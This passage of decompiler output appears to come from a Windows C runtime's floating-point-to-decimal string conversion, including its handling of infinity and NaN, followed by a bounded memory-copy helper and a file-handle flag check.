  int v60; // eax
  int v61; // eax
  unsigned int v62; // edi
  unsigned int v63; // ecx
  __int32 v64; // er8
  __int64 v65; // rax
  unsigned __int32 v66; // edx
  __int64 v67; // rax
  unsigned __int64 v68; // r8
  int v69; // eax
  int v70; // eax
  int v71; // edi
  char v72; // al
  unsigned int v73; // ecx
  __int32 v74; // er8
  __int64 v75; // rax
  unsigned __int32 v76; // edx
  __int64 v77; // rax
  char v78; // di
  unsigned int v79; // esi
  __int64 v80; // rbx
  unsigned int v81; // eax
  unsigned int v82; // er12
  int v83; // er13
  __int64 v84; // rax
  __int64 v85; // rsi
  unsigned __int64 v86; // rbx
  unsigned int v87; // er11
  unsigned __int64 v88; // r8
  __int64 v89; // r10
  __int64 v90; // r9
  unsigned __int64 v91; // rcx
  char v92; // al
  __int64 v93; // rbx
  unsigned __int64 v94; // r8
  __int64 v95; // r9
  unsigned __int64 v96; // rcx
  unsigned int v97; // er12
  __m128i *v98; // r13
  __m128i *v99; // rdx
  __int64 v100; // r10
  __int64 v101; // rsi
  unsigned __int64 v102; // rbx
  unsigned int v103; // er9
  __int64 v104; // r8
  __int64 v105; // rdx
  unsigned __int64 v106; // rdx
  __int64 v107; // rcx
  unsigned __int64 v108; // rdx
  unsigned __int64 v109; // r8
  int v110; // edi
  int v111; // eax
  unsigned int v112; // eax
  unsigned __int64 v113; // r8
  unsigned int v114; // er9
  __int64 v115; // rdx
  unsigned __int64 v116; // rcx
  unsigned int v117; // ecx
  unsigned int v118; // eax
  unsigned int v119; // er12
  int v120; // er13
  __int64 v121; // rax
  __int64 v122; // rsi
  unsigned __int64 v123; // rbx
  unsigned int v124; // edi
  unsigned __int64 v125; // r8
  __int64 v126; // r10
  __int64 v127; // r9
  unsigned __int64 v128; // rcx
  char v129; // al
  __int64 v130; // rbx
  unsigned __int64 v131; // r8
  __int64 v132; // r9
  unsigned __int64 v133; // rcx
  unsigned int v134; // er12
  __m128i *v135; // r13
  __m128i *v136; // rdx
  __int64 v137; // r10
  __int64 v138; // rsi
  unsigned __int64 v139; // rbx
  unsigned int v140; // er9
  __int64 v141; // r8
  __int64 v142; // rdx
  unsigned __int64 v143; // rdx
  __int64 v144; // rcx
  unsigned __int64 v145; // rdx
  unsigned __int64 v146; // r8
  unsigned int v147; // ecx
  unsigned int v148; // eax
  unsigned __int64 v149; // r8
  unsigned int v150; // er9
  __int64 v151; // rdx
  unsigned __int64 v152; // rcx
  _BYTE *v153; // rsi
  _BYTE *v154; // rbx
  unsigned __int64 v155; // r8
  unsigned int v156; // er9
  __int64 v157; // rdx
  unsigned __int64 v158; // r8
  int v159; // eax
  unsigned __int64 v160; // r8
  unsigned int v161; // er9
  __int64 v162; // rdx
  unsigned __int64 v163; // r8
  unsigned int v164; // ecx
  __int64 v165; // rdi
  _BYTE *i; // rdi
  unsigned int v167; // er10
  unsigned __int64 v168; // r8
  unsigned int v169; // er9
  __int64 v170; // rdx
  unsigned __int64 v171; // rcx
  unsigned int v172; // er8
  unsigned int j; // er9
  char v174; // cl
  int v175; // [rsp+30h] [rbp-D0h]
  __m128i *v176; // [rsp+38h] [rbp-C8h] BYREF
  unsigned int v177; // [rsp+40h] [rbp-C0h]
  int v178; // [rsp+44h] [rbp-BCh]
  unsigned int v179; // [rsp+48h] [rbp-B8h]
  unsigned int v180; // [rsp+4Ch] [rbp-B4h]
  _BYTE *v181; // [rsp+50h] [rbp-B0h]
  __m128i *v182; // [rsp+58h] [rbp-A8h]
  __int64 v183; // [rsp+60h] [rbp-A0h] BYREF
  char v184; // [rsp+68h] [rbp-98h]
  __int64 v185; // [rsp+70h] [rbp-90h]
  unsigned int v186; // [rsp+80h] [rbp-80h] BYREF
  __m128i v187[28]; // [rsp+84h] [rbp-7Ch] BYREF
  unsigned int v188; // [rsp+250h] [rbp+150h] BYREF
  __m128i v189; // [rsp+254h] [rbp+154h] BYREF
  unsigned int v190; // [rsp+420h] [rbp+320h]
  __m128i v191[28]; // [rsp+424h] [rbp+324h] BYREF
  unsigned int v192; // [rsp+5F0h] [rbp+4F0h]
  __m128i v193; // [rsp+5F4h] [rbp+4F4h] BYREF

  v176 = (__m128i *)a1;
  v181 = a4;
  v185 = a3;
  sub_13F177124(&v183);
  if ( (v183 & 0x1F) == 31 )
  {
    v184 = 0;
  }
  else
  {
    sub_13F177190(&v183);
    v184 = 1;
  }
  v8 = (__int64)v176;
  v9 = (__int64)v176;
  *(_QWORD *)(a3 + 8) = a4;
  *(_DWORD *)a3 = v9 < 0 ? 45 : 32;
  if ( (v8 & 0x7FF0000000000000i64) == 0 && (v8 & 0xFFFFFFFFFFFFFi64) == 0 )
  {
    *(_DWORD *)(a3 + 4) = 0;
    result = sub_13F16DD4C(a4, a5, (__int64)&dword_13F1961AC);
    if ( (_DWORD)result )
    {
      sub_13F1682F0();
      __debugbreak();
    }
    goto LABEL_320;
  }
  v11 = sub_13F16F924((__int64 *)&v176);
  if ( v11 )
    *(_DWORD *)(a3 + 4) = 1;
  v12 = v11 - 1;
  if ( !v12 )
  {
    result = sub_13F16DD4C(a4, a5, (__int64)"1#INF");
    if ( (_DWORD)result )
    {
      sub_13F1682F0();
      JUMPOUT(0x13F1764CAi64);
    }
    goto LABEL_320;
  }
  v13 = v12 - 1;
  if ( !v13 )
  {
    result = sub_13F16DD4C(a4, a5, (__int64)"1#QNAN");
    if ( (_DWORD)result )
    {
      sub_13F1682F0();
      __debugbreak();
    }
    goto LABEL_320;
  }
  v14 = v13 - 1;
  if ( !v14 )
  {
    result = sub_13F16DD4C(a4, a5, (__int64)"1#SNAN");
    if ( (_DWORD)result )
    {
      sub_13F1682F0();
      __debugbreak();
    }
    goto LABEL_320;
  }
  if ( v14 == 1 )
  {
    result = sub_13F16DD4C(a4, a5, (__int64)"1#IND");
    if ( (_DWORD)result )
    {
      sub_13F1682F0();
      __debugbreak();
    }
    goto LABEL_320;
  }
  v176 = (__m128i *)(v8 & 0x7FFFFFFFFFFFFFFFi64);
  v15 = v8 & 0x7FFFFFFFFFFFFFFFi64;
  v182 = (__m128i *)(v8 & 0x7FFFFFFFFFFFFFFFi64);
  v180 = a2 + 1;
  v16 = (v8 & 0x7FFFFFFFFFFFFFFFui64) >> 52;
  v17 = (v8 & 0xFFFFFFFFFFFFFi64) + (-(__int64)((v16 & 0x7FF) != 0) & 0x10000000000000i64);
  v18 = ((v16 & 0x7FF) == 0) + 1 + (v16 & 0x7FF) - 1076;
  sub_13F1772B0(*(double *)&v15);
  v19 = sub_13F1771E0(*(double *)&v15);
  v187[0].m128i_i32[0] = v17;
  v20 = HIDWORD(v17);
  v21 = (((int)v19 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v19 : 0;
  v187[0].m128i_i32[1] = v20;
  v175 = v21;
  v22 = ((_DWORD)v20 != 0) + 1;
  v186 = v22;
  if ( v18 < 0 )
  {
    if ( v18 != -1022 )
    {
      v191[0].m128i_i64[0] = 0x10000000000000i64;
      v190 = 2;
      if ( (_DWORD)v20 != 0 )
      {
        v59 = 0;
        while ( v191[0].m128i_i32[v59] == v187[0].m128i_i32[v59] )
        {
          if ( ++v59 == 2 )
          {
            v27 = !_BitScanReverse((unsigned int *)&v60, v20);
            LODWORD(v176) = 0;
            if ( v27 )
              v61 = 0;
            else
              v61 = v60 + 1;
            v62 = 32 - v61;
            v63 = 2;
            while ( 1 )
            {
              v64 = v63 >= v22 ? 0 : v187[0].m128i_i32[v63];
              v65 = v63 - 1;
              v66 = (unsigned int)v65 >= v22 ? 0 : v187[0].m128i_i32[v65];
              v67 = v63--;
              v187[0].m128i_i32[v67] = (4 * v64) ^ (v66 >> 30);
              if ( v63 == -1 )
                break;
              v22 = v186;
            }
            v34 = (v62 < 2) + 2;
            v186 = v34;
            sub_13F15EF70((__int64)v191, 0, 4i64 * ((unsigned int)(2 - v18) >> 5));
            v42 = ((unsigned int)(2 - v18) >> 5) + 1;
            v68 = 4i64 * v42;
            v191[0].m128i_i32[(unsigned int)(2 - v18) >> 5] = 1 << ((2 - v18) & 0x1F);
            goto LABEL_93;
          }
        }
      }
    }
    LODWORD(v176) = 0;
    v27 = !_BitScanReverse((unsigned int *)&v69, v187[0].m128i_u32[(_DWORD)v20 != 0]);
    if ( v27 )
      v70 = 0;
    else
      v70 = v69 + 1;
    v71 = 32 - v70;
    if ( ((_DWORD)v20 != 0) != 114 || (v72 = 1, v71) )
      v72 = 0;
    if ( v22 > 0x73 || v72 )
    {
      v34 = 0;
      v186 = 0;
    }
    else
    {
      v34 = 114;
      if ( v22 < 0x72 )
        v34 = v22;
      v73 = v34;
      while ( 1 )
      {
        v74 = v73 >= v22 ? 0 : v187[0].m128i_i32[v73];
        v75 = v73 - 1;
        v76 = (unsigned int)v75 >= v22 ? 0 : v187[0].m128i_i32[v75];
        v77 = v73--;
        v187[0].m128i_i32[v77] = (2 * v74) ^ (v76 >> 31);
        if ( v73 == -1 )
          break;
        v22 = v186;
      }
      if ( !v71 )
        ++v34;
      v186 = v34;
    }
    v78 = 1 - v18;
    v79 = (unsigned int)(1 - v18) >> 5;
    v80 = v79;
    sub_13F15EF70((__int64)v191, 0, v80 * 4);
    v42 = v79 + 1;
    v191[0].m128i_i32[v80] = 1 << (v78 & 0x1F);
    v68 = 4i64 * (v79 + 1);
LABEL_93:
    v188 = v42;
    v190 = v42;
    if ( v68 )
    {
      if ( v68 > 0x1CC )
      {
        sub_13F15EF70((__int64)&v189, 0, 0x1CCui64);
        *(_DWORD *)sub_13F169DAC() = 34;
        sub_13F1682A0();
      }
      else
      {
        sub_13F15EB00(&v189, v191, v68);
      }
      v42 = v188;
    }
  }
  else
  {
    v191[0].m128i_i64[0] = 0x10000000000000i64;
    v190 = 2;
    if ( (_DWORD)v20 != 0 )
    {
      v23 = 0;
      while ( v191[0].m128i_i32[v23] == v187[0].m128i_i32[v23] )
      {
        if ( ++v23 == 2 )
        {
          LODWORD(v176) = 0;
          v24 = (v18 + 2) & 0x1F;
          v25 = (unsigned int)(v18 + 2) >> 5;
          v26 = (1i64 << (32 - ((v18 + 2) & 0x1Fu))) - 1;
          v27 = !_BitScanReverse((unsigned int *)&v28, v20);
          if ( v27 )
            v29 = 0;
          else
            v29 = v28 + 1;
          v30 = 32 - v29;
          v31 = v25 + 2;
          v32 = v24 > v30;
          if ( v25 != 113 || (v33 = 1, v24 <= v30) )
            v33 = 0;
          if ( v31 > 0x73 || v33 )
          {
            v34 = 0;
            v186 = 0;
          }
          else
          {
            v34 = 114;
            if ( v31 < 0x72 )
              v34 = v25 + 2;
            v35 = v34 - v25;
            while ( 1 )
            {
              v36 = (unsigned int)v35 + v25;
              if ( (unsigned int)v36 < v25 )
                break;
              v37 = (unsigned int)v35 >= v22 ? 0 : v187[0].m128i_i32[v35];
              v38 = (unsigned int)(v35 - 1);
              v39 = (unsigned int)v38 >= v22 ? 0 : v187[0].m128i_i32[v38];
              v35 = (unsigned int)(v35 - 1);
              v187[0].m128i_i32[v36] = ((v26 & v37) << v24) | ((~v26 & (unsigned int)v39) >> (32 - v24));
              if ( (_DWORD)v35 + v25 == -1 )
                break;
              v22 = v186;
            }
            v40 = 0;
            if ( v25 )
            {
              do
              {
                v41 = v40++;
                v187[0].m128i_i32[v41] = 0;
              }
              while ( v40 != v25 );
            }
            if ( v32 )
              ++v34;
            v186 = v34;
          }
          v189.m128i_i32[0] = 4;
          goto LABEL_46;
        }
      }
    }
    LODWORD(v176) = 0;
    v43 = (v18 + 1) & 0x1F;
    v44 = (unsigned int)(v18 + 1) >> 5;
    v45 = (1i64 << (32 - ((v18 + 1) & 0x1Fu))) - 1;
    v27 = !_BitScanReverse((unsigned int *)&v46, v187[0].m128i_u32[(_DWORD)v20 != 0]);
    if ( v27 )
      v47 = 0;
    else
      v47 = v46 + 1;
    v48 = 32 - v47;
    v49 = v22 + v44;
    v50 = v43 > v48;
    v51 = v22 + v44 == 115 && v43 > v48;
    if ( v49 > 0x73 || v51 )
    {
      v34 = 0;
      v186 = 0;
    }
    else
    {
      v34 = 114;
      if ( v49 < 0x72 )
        v34 = v22 + v44;
      v52 = v34 - v44;
      while ( 1 )
      {
        v53 = (unsigned int)v52 + v44;
        if ( (unsigned int)v53 < v44 )
          break;
        v54 = (unsigned int)v52 >= v22 ? 0 : v187[0].m128i_i32[v52];
        v55 = (unsigned int)(v52 - 1);
        v56 = (unsigned int)v55 >= v22 ? 0 : v187[0].m128i_i32[v55];
        v187[0].m128i_i32[v53] = ((~v45 & (unsigned int)v56) >> (32 - v43)) | ((v45 & v54) << v43);
        v52 = (unsigned int)(v52 - 1);
        if ( (_DWORD)v52 + v44 == -1 )
          break;
        v22 = v186;
      }
      v57 = 0;
      if ( v44 )
      {
        do
        {
          v58 = v57++;
          v187[0].m128i_i32[v58] = 0;
        }
        while ( v57 != v44 );
      }
      if ( v50 )
        ++v34;
      v186 = v34;
    }
    v189.m128i_i32[0] = 2;
LABEL_46:
    v21 = (((int)v19 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v19 : 0;
    v42 = 1;
    v188 = 1;
    v190 = 1;
    v191[0].m128i_i32[1] = 0;
  }
  if ( v21 >= 0 )
  {
    v81 = v21 / 0xAu;
    v179 = v81;
    v82 = v21 / 0xAu;
    v177 = v81;
    if ( !v81 )
      goto LABEL_186;
    while ( 1 )
    {
      v83 = v82;
      if ( v82 > 0x26 )
        v83 = 38;
      v178 = v83;
      v84 = (unsigned int)(v83 - 1);
      v85 = (unsigned __int8)byte_13F1960F3[4 * v84];
      v86 = 4i64 * (unsigned __int8)byte_13F1960F2[4 * v84];
      v190 = v85 + (unsigned __int8)byte_13F1960F2[4 * v84];
      sub_13F15EF70((__int64)v191, 0, v86);
      sub_13F15EB00(
        (__m128i *)((char *)v191 + v86),
        (const __m128i *)((char *)qword_13F1957E0 + 4 * (unsigned __int16)word_13F1960F0[2 * (v83 - 1)]),
        4 * v85);
      v87 = v190;
      if ( v190 > 1 )
      {
        if ( v42 > 1 )
        {
          v97 = v42;
          v98 = v191;
          v99 = &v189;
          if ( v190 >= v42 )
            v98 = &v189;
          if ( v190 < v42 )
          {
            v97 = v190;
            if ( v190 < v42 )
              v87 = v42;
          }
          if ( v190 >= v42 )
            v99 = v191;
          v42 = 0;
          v100 = 0i64;
          v176 = v99;
          v192 = 0;
          while ( 1 )
          {
            v101 = v98->m128i_u32[v100];
            if ( (_DWORD)v101 )
            {
              LODWORD(v102) = 0;
              v103 = v100;
              if ( v87 )
              {
                while ( v103 != 115 )
                {
                  if ( v103 == v42 )
                  {
                    v193.m128i_i32[v103] = 0;
                    v192 = v103 + 1;
                  }
                  v104 = v103;
                  v105 = v99->m128i_u32[v103 - (unsigned int)v100];
                  ++v103;
                  v106 = v193.m128i_u32[v104] + (unsigned int)v102 + v101 * v105;
                  v193.m128i_i32[v104] = v106;
                  v42 = v192;
                  v102 = HIDWORD(v106);
                  if ( v103 - (_DWORD)v100 == v87 )
                    break;
                  v99 = v176;
                }
                if ( (_DWORD)v102 )
                {
                  while ( v103 != 115 )
                  {
                    if ( v103 == v42 )
                    {
                      v193.m128i_i32[v103] = 0;
                      v192 = v103 + 1;
                    }
                    v107 = v103++;
                    v108 = v193.m128i_u32[v107] + (unsigned __int64)(unsigned int)v102;
                    v193.m128i_i32[v107] = v108;
                    v42 = v192;
                    LODWORD(v102) = HIDWORD(v108);
                    if ( !HIDWORD(v108) )
                      goto LABEL_173;
                  }
LABEL_195:
                  v42 = 0;
                  v188 = 0;
LABEL_273:
                  v110 = (((int)v19 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v19 : 0;
LABEL_274:
                  v153 = v181;
                  v154 = v181;
                  if ( v34 )
                  {
                    LODWORD(v155) = 0;
                    v156 = 0;
                    do
                    {
                      v157 = v156++;
                      v158 = (unsigned int)v155 + 10i64 * v187[0].m128i_u32[v157];
                      v187[0].m128i_i32[v157] = v158;
                      v155 = HIDWORD(v158);
                    }
                    while ( v156 != v34 );
                    if ( (_DWORD)v155 )
                    {
                      if ( v186 >= 0x73 )
                      {
                        v190 = 0;
                        v186 = 0;
                        sub_13F1764CC(v187, 0x1CCui64, v191, 0i64);
                      }
                      else
                      {
                        v187[0].m128i_i32[v186++] = v155;
                      }
                    }
                  }
                  goto LABEL_281;
                }
              }
LABEL_173:
              if ( v103 == 115 )
                goto LABEL_195;
              v99 = v176;
            }
            else if ( (_DWORD)v100 == v42 )
            {
              v193.m128i_i32[v100] = 0;
              v42 = v100 + 1;
              v192 = v100 + 1;
            }
            v100 = (unsigned int)(v100 + 1);
            if ( (_DWORD)v100 == v97 )
            {
              v109 = 4i64 * v42;
              v188 = v42;
              if ( v109 )
              {
                if ( v109 > 0x1CC )
                {
                  sub_13F15EF70((__int64)&v189, 0, 0x1CCui64);
                  *(_DWORD *)sub_13F169DAC() = 34;
                  sub_13F1682A0();
                }
                else
                {
                  sub_13F15EB00(&v189, &v193, v109);
                }
                v42 = v188;
              }
              v82 = v177;
              v83 = v178;
              goto LABEL_182;
            }
          }
        }
        v93 = v189.m128i_u32[0];
        v94 = 4i64 * v190;
        v42 = v190;
        v188 = v190;
        if ( v94 )
        {
          if ( v94 > 0x1CC )
          {
            sub_13F15EF70((__int64)&v189, 0, 0x1CCui64);
            *(_DWORD *)sub_13F169DAC() = 34;
            sub_13F1682A0();
          }
          else
          {
            sub_13F15EB00(&v189, v191, v94);
          }
          v42 = v188;
        }
        if ( !(_DWORD)v93 )
        {
LABEL_128:
          v42 = 0;
          goto LABEL_129;
        }
        if ( (_DWORD)v93 == 1 || !v42 )
          goto LABEL_182;
        LODWORD(v88) = 0;
        v95 = 0i64;
        do
        {
          v96 = (unsigned int)v88 + v93 * v189.m128i_u32[v95];
          v189.m128i_i32[v95] = v96;
          v88 = HIDWORD(v96);
          v95 = (unsigned int)(v95 + 1);
        }
        while ( (_DWORD)v95 != v42 );
      }
      else
      {
        if ( !v191[0].m128i_i32[0] )
          goto LABEL_128;
        if ( v191[0].m128i_i32[0] == 1 || !v42 )
          goto LABEL_182;
        LODWORD(v88) = 0;
        v89 = v191[0].m128i_u32[0];
        v90 = 0i64;
        do
        {
          v91 = (unsigned int)v88 + v89 * v189.m128i_u32[v90];
          v189.m128i_i32[v90] = v91;
          v88 = HIDWORD(v91);
          v90 = (unsigned int)(v90 + 1);
        }
        while ( (_DWORD)v90 != v42 );
      }
      if ( !(_DWORD)v88 )
        break;
      if ( v188 < 0x73 )
      {
        v189.m128i_i32[v188] = v88;
        v42 = v188 + 1;
LABEL_129:
        v188 = v42;
LABEL_182:
        v92 = 1;
        goto LABEL_183;
      }
      v42 = 0;
      v188 = 0;
      v92 = 0;
LABEL_183:
      if ( !v92 )
        goto LABEL_195;
      v82 -= v83;
      v177 = v82;
      if ( !v82 )
      {
        v81 = v179;
LABEL_186:
        v110 = (((int)v19 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v19 : 0;
        v111 = 10 * v81;
        if ( v175 == v111 )
          goto LABEL_274;
        v112 = dword_13F196188[v175 - v111 - 1];
        if ( v112 )
        {
          if ( v112 == 1 || !v42 )
            goto LABEL_274;
          LODWORD(v113) = 0;
          v114 = 0;
          do
          {
            v115 = v114++;
            v116 = (unsigned int)v113 + v112 * (unsigned __int64)v189.m128i_u32[v115];
            v189.m128i_i32[v115] = v116;
            v113 = HIDWORD(v116);
          }
          while ( v114 != v42 );
          if ( !HIDWORD(v116) )
          {
            v42 = v188;
            goto LABEL_274;
          }
          if ( v188 < 0x73 )
          {
            v189.m128i_i32[v188] = HIDWORD(v116);
            v42 = ++v188;
            goto LABEL_274;
          }
        }
        v42 = 0;
        v188 = 0;
        goto LABEL_274;
      }
    }
    v42 = v188;
    goto LABEL_182;
  }
  v117 = -v21;
  v178 = -v21;
  v118 = v117 / 0xA;
  LODWORD(v176) = -v21 / 0xAu;
  v119 = (unsigned int)v176;
  v177 = v117 / 0xA;
  if ( !(v117 / 0xA) )
    goto LABEL_261;
  do
  {
    v120 = v119;
    if ( v119 > 0x26 )
      v120 = 38;
    v179 = v120;
    v121 = (unsigned int)(v120 - 1);
    v122 = (unsigned __int8)byte_13F1960F3[4 * v121];
    v123 = 4i64 * (unsigned __int8)byte_13F1960F2[4 * v121];
    v190 = v122 + (unsigned __int8)byte_13F1960F2[4 * v121];
    sub_13F15EF70((__int64)v191, 0, v123);
    sub_13F15EB00(
      (__m128i *)((char *)v191 + v123),
      (const __m128i *)((char *)qword_13F1957E0 + 4 * (unsigned __int16)word_13F1960F0[2 * (v120 - 1)]),
      4 * v122);
    v124 = v190;
    if ( v190 > 1 )
    {
      if ( v34 > 1 )
      {
        v134 = v34;
        v135 = v191;
        v136 = v187;
        if ( v190 >= v34 )
          v135 = v187;
        if ( v190 < v34 )
        {
          v134 = v190;
          if ( v190 < v34 )
            v124 = v34;
        }
        if ( v190 >= v34 )
          v136 = v191;
        v34 = 0;
        v137 = 0i64;
        v182 = v136;
        v192 = 0;
        do
        {
          v138 = v135->m128i_u32[v137];
          if ( (_DWORD)v138 )
          {
            LODWORD(v139) = 0;
            v140 = v137;
            if ( v124 )
            {
              while ( v140 != 115 )
              {
                if ( v140 == v34 )
                {
                  v193.m128i_i32[v140] = 0;
                  v192 = v140 + 1;
                }
                v141 = v140;
                v142 = v136->m128i_u32[v140 - (unsigned int)v137];
                ++v140;
                v143 = (unsigned int)v139 + v193.m128i_u32[v141] + v138 * v142;
                v193.m128i_i32[v141] = v143;
                v34 = v192;
                v139 = HIDWORD(v143);
                if ( v140 - (_DWORD)v137 == v124 )
                  break;
                v136 = v182;
              }
              if ( (_DWORD)v139 )
              {
                while ( v140 != 115 )
                {
                  if ( v140 == v34 )
                  {
                    v193.m128i_i32[v140] = 0;
                    v192 = v140 + 1;
                  }
                  v144 = v140++;
                  v145 = (unsigned int)v139 + (unsigned __int64)v193.m128i_u32[v144];
                  v193.m128i_i32[v144] = v145;
                  v34 = v192;
                  LODWORD(v139) = HIDWORD(v145);
                  if ( !HIDWORD(v145) )
                    goto LABEL_248;
                }
LABEL_270:
                v153 = v181;
                v110 = (((int)v19 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v19 : 0;
                v154 = v181;
                v186 = 0;
                goto LABEL_281;
              }
            }
LABEL_248:
            if ( v140 == 115 )
              goto LABEL_270;
            v136 = v182;
          }
          else if ( (_DWORD)v137 == v34 )
          {
            v193.m128i_i32[v137] = 0;
            v34 = v137 + 1;
            v192 = v137 + 1;
          }
          v137 = (unsigned int)(v137 + 1);
        }
        while ( (_DWORD)v137 != v134 );
        v146 = 4i64 * v34;
        v186 = v34;
        if ( v146 )
        {
          if ( v146 > 0x1CC )
          {
            sub_13F15EF70((__int64)v187, 0, 0x1CCui64);
            *(_DWORD *)sub_13F169DAC() = 34;
            sub_13F1682A0();
          }
          else
          {
            sub_13F15EB00(v187, &v193, v146);
          }
          v34 = v186;
        }
        v119 = v177;
        v120 = v179;
        goto LABEL_257;
      }
      v130 = v187[0].m128i_u32[0];
      v131 = 4i64 * v190;
      v34 = v190;
      v186 = v190;
      if ( v131 )
      {
        if ( v131 > 0x1CC )
        {
          sub_13F15EF70((__int64)v187, 0, 0x1CCui64);
          *(_DWORD *)sub_13F169DAC() = 34;
          sub_13F1682A0();
        }
        else
        {
          sub_13F15EB00(v187, v191, v131);
        }
        v34 = v186;
      }
      if ( !(_DWORD)v130 )
      {
LABEL_203:
        v34 = 0;
        goto LABEL_204;
      }
      if ( (_DWORD)v130 == 1 || !v34 )
        goto LABEL_257;
      LODWORD(v125) = 0;
      v132 = 0i64;
      do
      {
        v133 = (unsigned int)v125 + v130 * v187[0].m128i_u32[v132];
        v187[0].m128i_i32[v132] = v133;
        v125 = HIDWORD(v133);
        v132 = (unsigned int)(v132 + 1);
      }
      while ( (_DWORD)v132 != v34 );
    }
    else
    {
      if ( !v191[0].m128i_i32[0] )
        goto LABEL_203;
      if ( v191[0].m128i_i32[0] == 1 || !v34 )
        goto LABEL_257;
      LODWORD(v125) = 0;
      v126 = v191[0].m128i_u32[0];
      v127 = 0i64;
      do
      {
        v128 = (unsigned int)v125 + v126 * v187[0].m128i_u32[v127];
        v187[0].m128i_i32[v127] = v128;
        v125 = HIDWORD(v128);
        v127 = (unsigned int)(v127 + 1);
      }
      while ( (_DWORD)v127 != v34 );
    }
    if ( !(_DWORD)v125 )
    {
      v34 = v186;
      goto LABEL_257;
    }
    if ( v186 >= 0x73 )
    {
      v34 = 0;
      v186 = 0;
      v129 = 0;
      goto LABEL_258;
    }
    v187[0].m128i_i32[v186] = v125;
    v34 = v186 + 1;
LABEL_204:
    v186 = v34;
LABEL_257:
    v129 = 1;
LABEL_258:
    if ( !v129 )
      goto LABEL_270;
    v119 -= v120;
    v177 = v119;
  }
  while ( v119 );
  v117 = v178;
  v118 = (unsigned int)v176;
LABEL_261:
  v147 = v117 - 10 * v118;
  if ( !v147 )
    goto LABEL_273;
  v148 = dword_13F196188[v147 - 1];
  if ( !v148 )
    goto LABEL_270;
  if ( v148 == 1 || !v34 )
    goto LABEL_273;
  LODWORD(v149) = 0;
  v150 = 0;
  do
  {
    v151 = v150++;
    v152 = (unsigned int)v149 + v148 * (unsigned __int64)v187[0].m128i_u32[v151];
    v187[0].m128i_i32[v151] = v152;
    v149 = HIDWORD(v152);
  }
  while ( v150 != v34 );
  if ( !HIDWORD(v152) )
  {
    v34 = v186;
    goto LABEL_273;
  }
  v110 = (((int)v19 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v19 : 0;
  if ( v186 < 0x73 )
  {
    v187[0].m128i_i32[v186] = HIDWORD(v152);
    v34 = ++v186;
    goto LABEL_274;
  }
  v153 = v181;
  v154 = v181;
  v186 = 0;
LABEL_281:
  v159 = sub_13F174C90((__int64)&v186, &v188);
  if ( v159 == 10 )
  {
    ++v110;
    *v153 = 49;
    v154 = v153 + 1;
    if ( v42 )
    {
      LODWORD(v160) = 0;
      v161 = 0;
      do
      {
        v162 = v161++;
        v163 = (unsigned int)v160 + 10i64 * v189.m128i_u32[v162];
        v189.m128i_i32[v162] = v163;
        v160 = HIDWORD(v163);
      }
      while ( v161 != v42 );
      if ( (_DWORD)v160 )
      {
        if ( v188 >= 0x73 )
        {
          v190 = 0;
          v188 = 0;
          sub_13F1764CC(&v189, 0x1CCui64, v191, 0i64);
        }
        else
        {
          v189.m128i_i32[v188++] = v160;
        }
      }
    }
  }
  else if ( v159 )
  {
    v154 = v153 + 1;
    *v153 = v159 + 48;
  }
  else
  {
    --v110;
  }
  v164 = v180;
  *(_DWORD *)(v185 + 4) = v110;
  if ( v110 >= 0 && v164 <= 0x7FFFFFFF )
    v164 += v110;
  result = a5 - 1;
  v165 = v164;
  if ( a5 - 1 < (unsigned __int64)v164 )
    v165 = a5 - 1;
  for ( i = &v153[v165]; v154 != i; v154 += result )
  {
    v167 = v186;
    if ( !v186 )
      break;
    LODWORD(v168) = 0;
    v169 = 0;
    do
    {
      v170 = v169++;
      v171 = (unsigned int)v168 + 1000000000i64 * v187[0].m128i_u32[v170];
      v187[0].m128i_i32[v170] = v171;
      v168 = HIDWORD(v171);
    }
    while ( v169 != v167 );
    if ( HIDWORD(v171) )
    {
      if ( v186 >= 0x73 )
      {
        v190 = 0;
        v186 = 0;
        sub_13F1764CC(v187, 0x1CCui64, v191, 0i64);
      }
      else
      {
        v187[0].m128i_i32[v186++] = HIDWORD(v171);
      }
    }
    v172 = sub_13F174C90((__int64)&v186, &v188);
    for ( j = 8; j != -1; --j )
    {
      v174 = v172 % 0xA + 48;
      v172 /= 0xAu;
      if ( (int)i - (int)v154 >= j )
        v154[j] = v174;
    }
    result = i - v154;
    if ( i - v154 > 9 )
      result = 9i64;
  }
  *v154 = 0;
LABEL_320:
  if ( v184 )
    return sub_13F177144((int *)&v183);
  return result;
}
// 13F1764C5: control flows out of bounds to 13F1764CA
// 13F1753F8: conditional instruction was optimized away because er14.4<73u
// 13F175542: conditional instruction was optimized away because er14.4<73u
// 13F17576A: conditional instruction was optimized away because er14.4<73u
// 13F175A8E: conditional instruction was optimized away because er12.4>=2u
// 13F175F1E: conditional instruction was optimized away because er12.4>=2u
// 13F1957E0: using guessed type __int64 qword_13F1957E0[123];
// 13F1960F0: using guessed type __int16 word_13F1960F0[];
// 13F196188: using guessed type int dword_13F196188[];
// 13F1961AC: using guessed type int dword_13F1961AC;
// 13F175160: using guessed type __m128i var_5BC;
// 13F175160: using guessed type __m128i var_21C;

//----- (000000013F1764CC) ----------------------------------------------------
__int64 __fastcall sub_13F1764CC(__m128i *a1, unsigned __int64 a2, const __m128i *a3, unsigned __int64 a4)
{
  char *v8; // rax
  unsigned int v9; // ebx

  if ( !a4 )
    return 0i64;
  if ( !a1 )
    goto LABEL_4;
  if ( a3 && a2 >= a4 )
  {
    sub_13F15EB00(a1, a3, a4);
    return 0i64;
  }
  sub_13F15EF70((__int64)a1, 0, a2);
  if ( !a3 )
  {
LABEL_4:
    v8 = sub_13F169DAC();
    v9 = 22;
LABEL_5:
    *(_DWORD *)v8 = v9;
    sub_13F1682A0();
    return v9;
  }
  if ( a2 < a4 )
  {
    v8 = sub_13F169DAC();
    v9 = 34;
    goto LABEL_5;
  }
  return 22i64;
}

//----- (000000013F176554) ----------------------------------------------------
__int64 __fastcall sub_13F176554(int a1)
{
  if ( a1 == -2 )
  {
    *(_DWORD *)sub_13F169DAC() = 9;
  }
  else
  {
    if ( a1 >= 0 && (unsigned int)a1 < 0x40 )
      return *(_BYTE *)(qword_13F1C6400[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6) + 56) & 0x40;
    *(_DWORD *)sub_13F169DAC() = 9;
    sub_13F1682A0();
  }
